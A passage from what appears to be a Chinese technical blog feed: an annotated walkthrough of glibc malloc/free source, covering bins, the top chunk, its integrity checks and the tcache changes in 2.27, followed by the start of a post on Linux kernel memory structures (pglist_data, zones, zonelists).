av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */              bin = next_bin (bin);              bit &lt;&lt;= 1;            &#125;          else            &#123;              size = chunksize (victim);              /*  We know the first chunk in this bin is big enough to use. */              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));              remainder_size = size - nb;              /* unlink */              unlink (av, victim, bck, fwd);              /* Exhaust */              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                &#125;              /* 切块，然后剩余的给unsorted bin */              else                &#123;                  remainder = chunk_at_offset (victim, nb);                  /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);                  fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))                    &#123;                      errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                  /* advertise as last remainder */                  if (in_smallbin_range (nb))                    av-&gt;last_remainder = remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;</code></pre><p>以上即为普通的位图分配，倒是省下了诸多麻烦，这里通过寻找最小适配块来进行切割，剩下的就分配给unsorted bin</p><h3 id="step7-使用top-chunk"><a href="#step7-使用top-chunk" class="headerlink" title="step7 使用top chunk"></a>step7 使用top chunk</h3><p>  use_top:<br>      &#x2F;*<br>         If large enough, split off the chunk bordering the end of memory<br>         (held in av-&gt;top). Note that this is in accord with the best-fit<br>         search rule.  In effect, av-&gt;top is treated as larger (and thus<br>         less well fitting) than any other available chunk since it can<br>         be extended to be as large as necessary (up to system<br>         limitations).</p><pre><code class="hljs">     We require that av-&gt;top always exists (i.e., has size &gt;=     MINSIZE) after initialization, so if it would otherwise be     exhausted by current request, it is replenished. (The main     reason for ensuring it exists is that we may need MINSIZE space     to put in fenceposts in sysmalloc.)   */  victim = av-&gt;top;  size = chunksize (victim);  if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) //如果topchunk够分配，直接切割    &#123;      remainder_size = size - nb;      remainder = chunk_at_offset (victim, nb);      av-&gt;top = remainder;      set_head (victim, nb | PREV_INUSE |                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));      set_head (remainder, remainder_size | PREV_INUSE);      check_malloced_chunk (av, victim, nb);      void *p = chunk2mem (victim);      alloc_perturb (p, bytes);      return p;    &#125;  /* When we are using atomic ops to free fast chunks we can get     here for all block sizes.  */  else if (have_fastchunks (av)) //如果topchunk不够，且有fastchunk，那么进行malloc_consolidate进行合并fast，然后在接着分配    &#123;      malloc_consolidate (av);      /* restore original bin index */      if (in_smallbin_range (nb))        idx = smallbin_index (nb);      else        idx = largebin_index (nb);    &#125;  /*     Otherwise, relay to handle system-dependent cases   */  else //如果上述都不满足，则调用系统分配    &#123;      void *p = sysmalloc (nb, av);      if (p != NULL)        alloc_perturb (p, bytes);      return p;    &#125;&#125;</code></pre><p>}</p><p>至此，malloc分配分析结束，下面附赠一张分配流程图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b2114ea2f2838f8065380dd78e6b.jpg"></p><h2 id="0x02-free-步骤"><a href="#0x02-free-步骤" class="headerlink" title="0x02 free 步骤"></a>0x02 free 步骤</h2><h3 id="step1-free判断"><a href="#step1-free判断" class="headerlink" title="step1 free判断"></a>step1 free判断</h3><p>首先就是我们的<code>__libc_free</code></p><pre><code class="hljs">    void __libc_free (void *mem)    &#123;      mstate ar_ptr;      mchunkptr p;                          /* chunk corresponding to mem */          void (*hook) (void *, const void *)        = atomic_forced_read (__free_hook); //__free_hook      if (__builtin_expect (hook != NULL, 0))        &#123;          (*hook)(mem, RETURN_ADDRESS (0));          return;        &#125;          if (mem == 0)                              /* free(0) has no effect */        return;          p = mem2chunk (mem);          if (chunk_is_mmapped (p))                       /* release mmapped memory. */        &#123;          /* see if the dynamic brk/mmap threshold needs adjusting */          if (!mp_.no_dyn_threshold              &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold              &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)            &#123;              mp_.mmap_threshold = chunksize (p);              mp_.trim_threshold = 2 * mp_.mmap_threshold;              LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                          mp_.mmap_threshold, mp_.trim_threshold);            &#125;          munmap_chunk (p);          return;        &#125;          ar_ptr = arena_for_chunk (p);      _int_free (ar_ptr, p, 0);    &#125;</code></pre><h3 id="step2-安全检查"><a href="#step2-安全检查" class="headerlink" title="step2 安全检查"></a>step2 安全检查</h3><pre><code class="hljs">static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;        /* its size */  mfastbinptr *fb;             /* associated fastbin */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  const char *errstr = NULL;  int locked = 0;  size = chunksize (p);  /* Little security check which won&#39;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr = &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr = &quot;free(): invalid size&quot;;      goto errout;    &#125;  check_inuse_chunk(av, p);</code></pre><p>其中是对于一系列free参数的判断，我们看看即可</p><h3 id="step3-置入fastbin"><a href="#step3-置入fastbin" class="headerlink" title="step3 置入fastbin"></a>step3 置入fastbin</h3><p>首先如果判断其范围处于fastbin，则置入链表，当然，存在多个检测：）</p><pre><code class="hljs"> /*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) //处于fastbin范围内#if TRIM_FASTBINS      /*    If TRIM_FASTBINS set, don&#39;t place chunks    bordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif      ) &#123;    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)    || __builtin_expect (chunksize (chunk_at_offset (p, size))                 &gt;= av-&gt;system_mem, 0))      &#123;    /* We might not have a lock at this point and concurrent modifications       of system_mem might have let to a false positive.  Redo the test       after getting the lock.  */    if (have_lock        || (&#123; assert (locked == 0);          mutex_lock(&amp;av-&gt;mutex);          locked = 1;          chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;          &#125;))      &#123;        errstr = &quot;free(): invalid next size (fast)&quot;;        goto errout;      &#125;    if (! have_lock)      &#123;        (void)mutex_unlock(&amp;av-&gt;mutex);        locked = 0;      &#125;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); //清空chunk内数据     set_fastchunks(av); //设置av-&gt;flag的fast位？这里还不甚了解    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin (av, idx);    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do      &#123;    /* 检查fastbin链表头部是不是我们释放的该块，此即为double free检测       (i.e., double free).  */    if (__builtin_expect (old == p, 0))      &#123;        errstr = &quot;double free or corruption (fasttop)&quot;;        goto errout;      &#125;    /* 检查我们fastbin里链表头部size是否相同于我们即将添加的块.  We can dereference OLD       only if we have the lock, otherwise it might have already been       deallocated.  See use of OLD_IDX below for the actual check.  */    if (have_lock &amp;&amp; old != NULL)      old_idx = fastbin_index(chunksize(old));    p-&gt;fd = old2 = old;      &#125;    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))      &#123;    errstr = &quot;invalid fastbin entry (free)&quot;;    goto errout;      &#125;  &#125;</code></pre><h3 id="step4-若不是fastbin，则该去哪儿呢"><a href="#step4-若不是fastbin，则该去哪儿呢" class="headerlink" title="step4 若不是fastbin，则该去哪儿呢"></a>step4 若不是fastbin，则该去哪儿呢</h3><pre><code class="hljs">/*    合并其他非mmap分配的chunk  */  else if (!chunk_is_mmapped(p)) &#123; //若释放的堆块并不是fastbin大小    if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked = 1;    &#125;    nextchunk = chunk_at_offset(p, size);   ... //一系列检测    nextsize = chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))      &#123;    errstr = &quot;free(): invalid next size (normal)&quot;;    goto errout;      &#125;    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); //清空其中元素    /* 向后（backward）/上合并 */    if (!prev_inuse(p)) &#123;      prevsize = p-&gt;prev_size;      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;    if (nextchunk != av-&gt;top) &#123; //若nextchunk不是topchunk      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);      /* 向前（forward）/下合并 */      if (!nextinuse) &#123;    unlink(av, nextchunk, bck, fwd);    size += nextsize;      &#125; else    clear_inuse_bit_at_offset(nextchunk, 0);      /*    将该堆块置入unsorted bin. chunks直到下一次malloc的时候才会有机会置入合适的bins，此前一致存入unsorted bin      */      bck = unsorted_chunks(av);      fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))    &#123;      errstr = &quot;free(): corrupted unsorted chunks&quot;;      goto errout;    &#125;      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))    &#123;      p-&gt;fd_nextsize = NULL;      p-&gt;bk_nextsize = NULL;    &#125;      bck-&gt;fd = p;      fwd-&gt;bk = p;      set_head(p, size | PREV_INUSE);      set_foot(p, size);      check_free_chunk(av, p);    &#125;    /*      如果nextchunk是topchunk，此时我们就要将其合并入topchunk    */    else &#123;      size += nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top = p;      check_chunk(av, p);    &#125;        ···</code></pre><p>从源码可以得知除了fastbin范围，其他块均存入unsorted bin</p><p>至此，free的分析也就此结束，如果大伙是从上面的malloc看下来的，那么肯定会发现这个free较之于十分简单，其中也是因为一些重复的函数在malloc已经讲解过，再写一遍没有必要，其中我也省略了很多free过程当中的检测部分，因为这较之于我们今天分析的目的有点远了。</p><p>当然，附赠free过程图：</p><p><img src="http://imgsrc.baidu.com/form/pic/item/d6ca7bcb0a46f21f05de2f9eb3246b600d33ae11.jpg"></p><h2 id="0x03-glibc2-27版本差异"><a href="#0x03-glibc2-27版本差异" class="headerlink" title="0x03 glibc2.27版本差异"></a>0x03 glibc2.27版本差异</h2><p>我们都知道，在2.26及以上增加了tcache，其中使得我们存取块更加迅速，下面我们就来探讨一下其中较之于2.23的差别</p><h3 id="差异一：数据结构们"><a href="#差异一：数据结构们" class="headerlink" title="差异一：数据结构们"></a>差异一：数据结构们</h3><p>首先就是我们的tcache数据块，如下：</p><pre><code class="hljs">typedef struct tcache_entry&#123;  struct tcache_entry *next; //tcache链条&#125; tcache_entry;/* 每个线程都有这样的一个tcache数据管理结构体, which contains the   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping   overall size low is mildly important.  Note that COUNTS and ENTRIES   are redundant (we could have just counted the linked list each   time), this is for performance reasons.  */typedef struct tcache_perthread_struct&#123;  char counts[TCACHE_MAX_BINS]; //用一字节来代表一个tcache链表的数量  tcache_entry *entries[TCACHE_MAX_BINS]; //这里就是我们的链表指针数组&#125; tcache_perthread_struct;/* 一些宏定义 */#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS64# define MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize(). 通过size定位tcache数组下标 */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7//// //定义最大一个链条的tcache数量#endif</code></pre><h3 id="差异二：-libc-malloc"><a href="#差异二：-libc-malloc" class="headerlink" title="差异二：__libc_malloc"></a>差异二：__libc_malloc</h3><p>我们在使用<code>__libc_malloc</code>进行分配时，在调用malloc_hook后，int_malloc前会首先调用tcache_get函数来获取相关堆块</p><pre><code class="hljs">void *__libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);    //malloc_hook  if (__builtin_expect (hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE  /* int_free also calls request2size, be careful to not pad twice.  */  size_t tbytes;  checked_request2size (bytes, tbytes);  size_t tc_idx = csize2tidx (tbytes); //获取tcache对应size下标  MAYBE_INIT_TCACHE ();  DIAG_PUSH_NEEDS_COMMENT;  if (tc_idx &lt; mp_.tcache_bins      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */      &amp;&amp; tcache      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)    &#123;      return tcache_get (tc_idx); //直接从tcache取    &#125;  DIAG_POP_NEEDS_COMMENT;#endif</code></pre><hr><h4 id="题外话：tcache-get"><a href="#题外话：tcache-get" class="headerlink" title="题外话：tcache_get"></a>题外话：tcache_get</h4><pre><code class="hljs">/* Caller must ensure that we know tc_idx is valid and there&#39;s   available chunks to remove.  */static __always_inline void *tcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];   assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next; //从tcache链表头部取得堆块返回  --(tcache-&gt;counts[tc_idx]);  return (void *) e;&#125;</code></pre><p>结束，继续malloc</p><hr><h3 id="差异三：-int-malloc"><a href="#差异三：-int-malloc" class="headerlink" title="差异三：_int_malloc"></a>差异三：_int_malloc</h3><p>这里的差异即为在察觉到请求size是fastbin范围时，多的是下面那个<code>#if~#endif</code></p><pre><code class="hljs">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb);      mfastbinptr *fb = &amp;fastbin (av, idx);      mchunkptr pp;      victim = *fb;      if (victim != NULL)    &#123;      if (SINGLE_THREAD_P)        *fb = victim-&gt;fd;      else        REMOVE_FB (fb, pp, victim);      if (__glibc_likely (victim != NULL))        &#123;          size_t victim_idx = fastbin_index (chunksize (victim));          if (__builtin_expect (victim_idx != idx, 0))        malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);          check_remalloced_chunk (av, victim, nb);#if USE_TCACHE          /* 当我们运行至此, 如果fastbin该链条仍有其他堆块，则我们stash他们到tcache链条上*/          size_t tc_idx = csize2tidx (nb);          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count //不能超过7奥             &amp;&amp; (tc_victim = *fb) != NULL)            &#123;              if (SINGLE_THREAD_P)            *fb = tc_victim-&gt;fd;              else            &#123;              REMOVE_FB (fb, pp, tc_victim);              if (__glibc_unlikely (tc_victim == NULL))                break;            &#125;              tcache_put (tc_victim, tc_idx); //这里注意均为从头置入            &#125;        &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p; //搞完后正常返回堆块        &#125;    &#125;    &#125;</code></pre><p>这里就是在我们分配fastbin的时候，若链条上还有其他堆块，我们则需要将其中剩下的free堆块头插入tcache当中，调试源码会发现顺序刚好相反，因为是从fastbin头取，再头插至tcachebin</p><p>除了fastbin，还有在我们smallbin找到堆块时，若链表中也有剩余块，其也会用相同的手法头插入tcachebin当中，但是这里有个区别就是smallbin由于是从尾部取堆块，而不是跟fastbin一样从头取，关键区别如下（这里就不写其他的部分了）：</p><pre><code class="hljs">#if USE_TCACHE      /* While we&#39;re here, if we see other chunks of the same size,         stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks over.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        &#123;          if (tc_victim != 0)            &#123;              bck = tc_victim-&gt;bk; //从bk取，一直向上              set_inuse_bit_at_offset (tc_victim, nb);              if (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                &#125;        &#125;        &#125;#endif</code></pre><p>然后就是在for(;;)大循环的时候，unsorted bin while循环置入合适堆块bins的时候，首先会先置入tcache bins 而不是寻找到相应bins置入<br>如下：</p><pre><code class="hljs">         /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          /* Take now instead of binning if exact fit */          if (size == nb)            &#123;              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)        set_non_main_arena (victim);#if USE_TCACHE          /* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */          if (tcache_nb          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)        &#123;          tcache_put (victim, tc_idx); //tcache始终是第一位，堆块们想要回到合适的bins太难了：(          return_cached = 1;          continue;        &#125;          else        &#123;#endif</code></pre><h3 id="差异四：-int-free"><a href="#差异四：-int-free" class="headerlink" title="差异四：_int_free"></a>差异四：_int_free</h3><p>其中差异便是在调用<code>_int_free</code>时首先会调用<code>tcache_put</code></p><pre><code class="hljs">/*   ------------------------------ free ------------------------------ */static void_int_free (mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;        /* its size */  mfastbinptr *fb;             /* associated fastbin */  mchunkptr nextchunk;         /* next contiguous chunk */  INTERNAL_SIZE_T nextsize;    /* its size */  int nextinuse;               /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */  mchunkptr bck;               /* misc temp for linking */  mchunkptr fwd;               /* misc temp for linking */  size = chunksize (p);  /* Little security check which won&#39;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    malloc_printerr (&quot;free(): invalid pointer&quot;);  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    malloc_printerr (&quot;free(): invalid size&quot;);  check_inuse_chunk(av, p);#if USE_TCACHE  &#123;    size_t tc_idx = csize2tidx (size); //若free堆块大小处于tcachebin范围当中的话，执行下面语句    if (tcache    &amp;&amp; tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)      &#123;    tcache_put (p, tc_idx); //首先将其置入tcache当中    return;      &#125;  &#125;#endif </code></pre><hr><h4 id="题外话：tcache-put"><a href="#题外话：tcache-put" class="headerlink" title="题外话：tcache_put"></a>题外话：tcache_put</h4><pre><code class="hljs">/* Caller must ensure that we know tc_idx is valid and there&#39;s room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx]; //从头置入  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;</code></pre><hr><p>至此，个人所分析到的值得注意的差异就此结束</p><h2 id="0x04-glibc-2-32版本差异"><a href="#0x04-glibc-2-32版本差异" class="headerlink" title="0x04 glibc 2.32版本差异"></a>0x04 glibc 2.32版本差异</h2>]]></content>
    
    
    <categories>
      
      <category>Linux User</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>source</tag>
      
      <tag>user</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_memory_manegement</title>
    <link href="/2023/06/17/Linux-memory-manegement/"/>
    <url>/2023/06/17/Linux-memory-manegement/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux内存管理源码分析"><a href="#Linux内存管理源码分析" class="headerlink" title="Linux内存管理源码分析"></a>Linux内存管理源码分析</h1><p>内核pwn学到UAF，发现又不太行了，虽说之前操作系统的知识没啥问题了，但是这里对于目前市面上的内存管理还是不了解，因此在这里再来浅浅分析一下，整体的数据部分，Linux采用<code>node</code>、<code>zone</code>、<code>page</code>三级表示，接下来我们来分别叙述，这里若涉及到源码大家可以点击下面链接查看Linux内核相应版本查看</p><p><a href="https://elixir.bootlin.com/linux/v5.11.22/source">Linux 内核源码</a></p><p>本篇主要是个人跟随着arttnba3师傅：</p><p><a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">arttnba3</a></p><p>和cft56200_ln师傅：</p><p><a href="https://blog.csdn.net/caofengtao1314/article/details/117321692?spm=1001.2014.3001.5502">cft56200_ln</a></p><h2 id="1-数据结构部分"><a href="#1-数据结构部分" class="headerlink" title="1. 数据结构部分"></a>1. 数据结构部分</h2><h3 id="node节点"><a href="#node节点" class="headerlink" title="node节点"></a>node节点</h3><p>我们首先需要知道，对于内存访问架构来讲，一般CPU都可以分为以下两种方式：</p><ul><li>UMA(一致性内存访问，Uniform Memory Access)，表示全局就一个<code>node</code>，且多个CPU通过1跟总线访问内存，且访问时间一致，类似SMP</li><li>NUMA(非一致性内存访问，Not-Uniform Memory Access)，每个CPU分配一块内存，存在多个<code>node</code>，且再不同情况下使用访问时间有所区别。</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e84a7453394c8a786c8175c76.jpg"></p><p>而<code>node</code>的结构体是采用<code>pglist_data</code>结构进行描述，定义在<code>/include/linux/mmzone.h</code>,如下：</p><pre><code class="hljs">/* * On NUMA machines, each NUMA node would have a pg_data_t to describe * it&#39;s memory layout. On UMA machines there is a single pglist_data which * describes the whole memory.（NUMA架构每个node都有个此结构来描述内存布局，而UMA就一个） * * Memory statistics and page replacement data structures are maintained on a * per-zone basis. */typedef struct pglist_data &#123;    /*     * node_zones contains just the zones for THIS node. Not all of the     * zones may be populated, but it is the full list. It is referenced by     * this node&#39;s node_zonelists as well as other node&#39;s node_zonelists.     */    struct zone node_zones[MAX_NR_ZONES];    /*     * node_zonelists contains references to all zones in all nodes.     * Generally the first zones will be references to this node&#39;s     * node_zones.     */    struct zonelist node_zonelists[MAX_ZONELISTS];    int nr_zones; /* number of populated zones in this node */#ifdef CONFIG_FLAT_NODE_MEM_MAP/* means !SPARSEMEM */    struct page *node_mem_map;#ifdef CONFIG_PAGE_EXTENSION    struct page_ext *node_page_ext;#endif#endif#if defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)    /*     * Must be held any time you expect node_start_pfn,     * node_present_pages, node_spanned_pages or nr_zones to stay constant.     * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page     * init.     *     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to     * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG     * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.     *     * Nests above zone-&gt;lock and zone-&gt;span_seqlock     */    spinlock_t node_size_lock;#endif    unsigned long node_start_pfn;    unsigned long node_present_pages; /* total number of physical pages */    unsigned long node_spanned_pages; /* total size of physical page                         range, including holes */    int node_id;    wait_queue_head_t kswapd_wait;    wait_queue_head_t pfmemalloc_wait;    struct task_struct *kswapd;/* Protected by                       mem_hotplug_begin/end() */    int kswapd_order;    enum zone_type kswapd_highest_zoneidx;    int kswapd_failures;/* Number of &#39;reclaimed == 0&#39; runs */#ifdef CONFIG_COMPACTION    int kcompactd_max_order;    enum zone_type kcompactd_highest_zoneidx;    wait_queue_head_t kcompactd_wait;    struct task_struct *kcompactd;#endif    /*     * This is a per-node reserve of pages that are not available     * to userspace allocations.     */    unsigned longtotalreserve_pages;#ifdef CONFIG_NUMA    /*     * node reclaim becomes active if more unmapped pages exist.     */    unsigned longmin_unmapped_pages;    unsigned longmin_slab_pages;#endif /* CONFIG_NUMA */    /* Write-intensive fields used by page reclaim */    ZONE_PADDING(_pad1_)    spinlock_tlru_lock;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT    /*     * If memory initialisation on large machines is deferred then this     * is the first PFN that needs to be initialised.     */    unsigned long first_deferred_pfn;#endif /* CONFIG_DEFERRED_STRUCT_PAGE_INIT */#ifdef CONFIG_TRANSPARENT_HUGEPAGE    struct deferred_split deferred_split_queue;#endif    /* Fields commonly accessed by the page reclaim scanner */    /*     * NOTE: THIS IS UNUSED IF MEMCG IS ENABLED.     *     * Use mem_cgroup_lruvec() to look up lruvecs.     */    struct lruvec__lruvec;    unsigned longflags;    ZONE_PADDING(_pad2_)    /* Per-node vmstats */    struct per_cpu_nodestat __percpu *per_cpu_nodestats;    atomic_long_tvm_stat[NR_VM_NODE_STAT_ITEMS];&#125; pg_data_t;</code></pre><p>下面单独指出一些重要字段：</p><ul><li><strong>node_zones</strong>:node_zones contains just the zones for THIS node. Not all of the zones may be populated, but it is the full list. It is referenced by this node’s node_zonelists as well as other node’s node_zonelists.说人话，他是一个<code>struct zone</code>类型的数组，包含了仅仅这个<code>node</code>下的所有的<code>zone</code>,这里注意并非所有<code>zone</code>都被填充，但是他是已经被充满了，他被下面即将讲到的一个链表节点<code>node_zonelists</code>和其他<code>node</code>的<code>node_zonelists</code>引用；</li><li><strong>node_zonelists</strong>:不标英语了，看着烦人，这里我直接写他的含义，他的定义是为了确定内存分配的时候对备用<code>zone</code>的搜索顺序，他同时可以包含非本<code>node</code>的<code>zone</code>，普遍他的第一个<code>zone</code>链接的是本<code>node</code>下的<code>zone</code>数组第一个，其实这个<code>struct zonelist</code>就是一个指向<code>zone</code>的指针加上其他元素，我们可以看看他的数据结构，这里直接引用<code>arttnba3</code>师傅的笔记，</li></ul><p>如下：</p><pre><code class="hljs">/* * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表， * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。 * * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。 * 用来访问所给的 zoneref 结构体信息的帮助函数有： * * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index * zonelist_node_idx()- 返回作为 entry 的 node 的 index */struct zonelist &#123;    struct zoneref _zonerefs[MAX_ZONES_PER_ZONELIST + 1];&#125;;</code></pre><p>   其中是一个<code>struct zoneref</code>数组，接下来再看看其中的结构</p><pre><code class="hljs">/* * 该结构包含了 zonelist 中一个 zone 的信息。  * 其被储存在这里以预防对大结构体的解引用与对表的查询。 */struct zoneref &#123;    struct zone *zone;/* 指向实际上的 zone 的指针 */    int zone_idx;/* zone_idx(zoneref-&gt;zone) */&#125;;</code></pre><p>   可以看到其就是一个指针而已</p><ul><li><strong>nr_zones</strong>:记录了该<code>node</code>中所有可用的<code>zone</code>数量</li><li><strong>node_start_pfn</strong>：<code>node</code>起始页的页框标号，这里的<code>pfn</code>我们在之后讲解，这里可以理解为该<code>node</code>所在的物理地址</li><li><strong>node_present_pages</strong>：<code>node</code>中物理页的总数量</li><li><strong>unsighnd long node_spanned_pages</strong>:<code>node</code>中物理页的总大小</li><li><strong>node_id</strong>：记录该<code>node</code>在系统中的标号，从0开始</li></ul><p>知道了其中的一些数据结构，接下来我们了解一下<code>node</code>的存储方式：我们可以在上面的网站中查找源码，在<code>/arch/x86/mm/numa.c</code>中看到其中定义了一个<code>pglist_data</code>的全局数组<code>node_data[]</code></p><pre><code class="hljs">struct pglist_data 